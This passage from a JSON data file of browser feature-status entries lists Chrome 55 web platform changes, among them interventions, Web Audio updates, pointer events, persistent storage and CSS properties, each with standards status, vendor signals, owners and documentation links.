    "summary": "HTTP/0.9 is the predecessor to HTTP/1.x. One big difference between HTTP/0.9 and HTTP/1.x is that HTTP/0.9 lacks any response headers. So when we send an HTTP/1.x request, if the server responds with a message that doesn't look like HTTP/1.x, we just assume it's an HTTP/0.9 response and treat the entire response is the response body, with no headers.  We're removing this behavior except on default ports, and plan to further reduce support in the future.",
    "id": 5633064474509312,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:58.428330",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Blocking the load of cross-origin, parser-blocking scripts inserted via document.write for users on 2G",
    "tags": [
      "intervention"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/WICG/interventions/issues/17",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 55
        },
        "owners": [
          "shivanisha@chromium.org",
          "bmcquade@chromium.org",
          "jkarlin@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "ios": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/640844",
        "intervention": true
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "For users on slow connections such as 2G, the performance penalty from third-party scripts loaded via document.write is often so severe as to delay display of main page content for tens of seconds. This feature will block the load of cross-origin, parser-blocking scripts inserted via document.write in case of an HTTP cache miss for users on a 2G connection. The feature will only be applicable to such scripts in the main frame. ",
    "id": 5718547946799104,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/08/removing-document-write",
        "https://developer.mozilla.org/en-US/docs/Web/API/Document/write",
        "https://docs.google.com/document/d/1dMJRQKTw75ZNdknP3pirSBH3koPl_IWHnxlcBuu4t_c/edit?usp=sharing",
        "https://docs.google.com/document/d/1FSegTIN91btRwPCIrt6s3X63cdOJmNjcr0p2mhlOAW8/edit?usp=sharing",
        "https://docs.google.com/document/d/1AtS83d9joGj-xmt_pZB4Uvvn_9d1aEReRg0rI_5runw/edit",
        "",
        ""
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:13.979040",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Web Audio user gesture requirement on cross origin iframes on Android",
    "tags": [
      "webaudio",
      "autoplay"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/614115",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This will require a user gesture in order to start playback using Web Audio in a cross origin iframe, the same way a user gesture is required to play an audio or video element.",
    "id": 6406908126691328,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/28",
        "https://github.com/WebAudio/web-audio-api/issues/836"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-09-10 22:30:10.246480",
      "by": "ericbidelman@google.com"
    },
    "name": "Intl.DateTimeFormat.prototype.formatToParts()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/tc39/ecma402/files/41759/formatToParts.pdf",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1289340",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 55
        },
        "owners": [
          "jshin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>Internationalization"
        ],
        "desktop": 55,
        "flag": true,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5244",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Intl.DateTimeFormat.prototype.formatToParts() is scheduled to be added to the EcmaScript Internationalization API specification (Ecma 402). \r\n\r\nIt adds a method to format date and time to a list of tokens and their type (e.g. literal, day, year, month, hour, minute, era, etc). \r\n\r\nIt's implemented and shipped by Firefox. v8 implemented it behind a flag.",
    "id": 6319456309477376,
    "resources": {
      "docs": [
        "https://github.com/tc39/ecma402/issues/30",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DateTimeFormat/formatToParts",
        "https://github.com/zbraniecki/proposal-intl-formatToParts"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:28.851780",
      "by": "ericbidelman@google.com"
    },
    "name": "Make Event.composedPath() behavior on window match that on document",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=645527",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The spec is: https://dom.spec.whatwg.org/#dom-event-composedpath\r\nThe relevant change of the spec: https://github.com/whatwg/dom/pull/327\r\n\r\nBefore: event.composedPath() on window object returns [window] in Blink, which does not include nodes in a document.\r\n\r\nAfter: event.composedPath() on window behaves the same way as that on document. It would include a node in a document tree.\r\n",
    "id": 4661261711179776,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:08.079600",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaStream constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/mediacapture-main/#mediastream",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/649331",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A prefixed constructor webkitMediaStream has been available since 2012. It will now be available without the prefix as MediaStream.",
    "id": 5912172546752512,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en/docs/Web/API/MediaStream"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:34.514520",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaStreamTrackEvent constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/mediacapture-main/#mediastreamtrackevent",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/646837",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This is a standard event constructor. Previously, the event interface was hidden, so that scripts could not create instances.",
    "id": 5005114376978432,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrackEvent"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:49.287070",
      "by": "ericbidelman@google.com"
    },
    "name": "New \"auxclick\" event for non-primary button click behavior",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://navidz.github.io/auxclick/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "nzolghadr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "ios": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/625847",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The new input event type \"auxclick\" introduced here provides web developers a way to listen to the click behavior of non-primary buttons, and potentially cancel their effect (eg. opening a new tab when middle clicking on a link). This new input type is needed because the \"click\" event is restricted to primary button only according to the spec https://w3c.github.io/uievents/#event-type-click. So after this change \"click\" event will no longer be dispatched for non-primary buttons.",
    "id": 5663174342737920,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/10/auxclick"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-06-14 18:28:33.515790",
      "by": "ericbidelman@google.com"
    },
    "name": "Persistent Storage Permission (Durable Storage)",
    "tags": [
      "durable",
      "persistent",
      "storage",
      "permission"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://storage.spec.whatwg.org/#persistence",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1298329",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "dknox@chromium.org",
          "dmurph@chromium.org",
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink>Storage>Quota"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=502373",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allow sites to request that web storage be treated as \"persistent\", preventing Chrome's automatic storage eviction from clearing storage for that site.\r\n\r\nThe permission is automatically granted when the site:\r\n- Is bookmarked (if the user has <= 5 bookmarks)\r\n- Is added to homescreen\r\n- Has push notification permissions\r\n- Has high site engagement\r\n\r\n(Launched as Origin Trial in M52)",
    "id": 4931497563783168,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-06-14 18:28:57.996080",
      "by": "ericbidelman@google.com"
    },
    "name": "Persistent storage",
    "tags": [
      "durable",
      "durability"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://storage.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/storage/issues",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "dgrogan@chromium.org",
          "jsbell@chromium.org",
          "slightlyoff@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=502373",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow origins to opt out of the browser's storage-eviction logic that is run when the user's storage space is running low.",
    "id": 5715811364765696,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/persistent-storage"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:26.499090",
      "by": "ericbidelman@google.com"
    },
    "name": "Pointer Events",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/pointerevents/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=822898",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "http://crbug.com/196799",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/ff972269(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2012-December/023050.html",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Unified pointer input API subsuming MouseEvent and TouchEvents which addresses several existing problems (especially on touchscreen laptops) and provides future extensibility.\r\n\r\nIntent-to-implement thread: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/ODWmcKNQl0I\r\n\r\nThis was behind a flag starting in Chrome 52.",
    "id": 4504699138998272,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/10/pointer-events",
        "https://developer.mozilla.org/en-US/docs/Web/API/PointerEvent"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:43.399930",
      "by": "ericbidelman@google.com"
    },
    "name": "Support \"once\" event listener option",
    "comments": "It is already supported in Safari Technology Preview 7, vaguely mentioned in https://webkit.org/blog/6640/release-notes-for-safari-technology-preview-release-7/",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-addeventlisteneroptions-once",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1287706",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "a.obzhirov@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=615384",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=149466",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support adding event listeners with the \"once\" option set to true.\r\nWhen set to true, options’s once member indicates that the callback will only be invoked once after which the event listener will be removed.\r\n",
    "id": 5630331130478592,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/10/addeventlistener-once"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:59.883690",
      "by": "ericbidelman@google.com"
    },
    "name": "Support dataset property on SVGElement",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://svgwg.org/svg2-draft/types.html#InterfaceSVGElement",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=921834",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "ramya.v@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=636108",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/204377",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Dataset is supported on HTMLElement. Recently spec was modified to support for SVGElement as well.\r\nhttps://svgwg.org/svg2-draft/types.html#InterfaceSVGElement",
    "id": 5727911176830976,
    "resources": {
      "samples": [
        "http://jsbin.com/butikiromu/edit?html,js,console"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:57.319790",
      "by": "ericbidelman@google.com"
    },
    "name": "Touch-action: pan-up pan-down pan-left pan-right CSS properties",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/pointerevents/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1285685",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/626101",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/touchactionpanuppandownpanleftpanrightcssproperties",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The touch-action CSS property determines whether touch input may trigger default behavior supplied by user agent. This includes, but is not limited to, behaviors such as panning or zooming.\r\n\r\nAdditional keywords indicating: pan-up, pan-down, pan-left, pan-right have been added to the specification.\r\n\r\n\r\n",
    "id": 5712439765106688,
    "resources": {
      "samples": [
        "http://dtapuska.github.io/touch-action/carousel.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:01.900850",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed CSS Clipping Paths",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.fxtf.org/css-masking-1/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1247229",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=633028",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/masks/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=126207",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The CSS Clipping Path (CSS Masking specification) property without the \"webkit\" prefix.",
    "id": 5742325112242176,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/clip-path",
        "http://docs.webplatform.org/wiki/css/properties/clip-path"
      ],
      "samples": [
        "https://css-tricks.com/clipping-masking-css/",
        "https://sarasoueidan.com/blog/css-svg-clipping/",
        "https://developer.mozilla.org/en-US/docs/Web/SVG/Applying_SVG_effects_to_HTML_content#Example_Clipping"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:47.646880",
      "by": "ericbidelman@google.com"
    },
    "name": "Update <textarea maxlength/minlength> behavior for linebreaks",
    "tags": [
      "HTML",
      "Forms"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#maximum-allowed-value-length",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "tkent@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink>Forms>Textarea"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "http://crbug.com/624361",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The specification was updated by https://github.com/whatwg/html/commit/163703186794c21daa92cc2718218afa44f26071.\r\n\r\nBefore the change, maxlength/minlength limits |value| length, not |API value| length.  In <textarea>, a single linebreak is represented as CR LF in |value|, and LF in |API value|.\r\n\r\nFirefox and Edge incorrectly applied to |API value|, and WebKit and Blink correctly applied to |value|.  But the specification followed Firefox and Edge.\r\n",
    "id": 5653898178068480,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-12-14 16:55:19.680520",
      "by": "jmedley@google.com"
    },
    "name": "WebAudio: Add BaseAudioContext",
    "tags": [
      "WebAudio",
      "AudioContext",
      "BaseAudioContext"
    ],
    "comments": "To fix the prototype ownership issue, replace ‘AudioContext.prototype.hasOwnProperty(functionName)’ with:\r\ntypeof AudioContext.prototype[functionName] === ‘function’",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WebAudio/web-audio-api/issues/1022#issuecomment-256681126",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "rtoy@chromim.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "ios": 55,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/555608",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Implement BaseAudioContext according to the spec. This introduces a trivial but user-visible change: querying `AudioContext.prototype.hasOwnProperty(functionName)` will fail. See the comment to see how to fix the potential issue.",
    "id": 5671957710241792,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#BaseAudioContext",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioContext"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:14.056830",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: AudioNode constructors",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "ios": 55,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "http://crbug.com/626449",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add constructor for WebAudio AudioNodes. Instead of saying \"context.createFoo()\", you can now say \"new FooNode(context, optionalOptions)\", roughly. ",
    "id": 6409704485945344,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/",
        "https://github.com/WebAudio/web-audio-api/issues/696",
        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API",
        ""
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:52.669680",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: close() removed from OfflineAudioContext",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
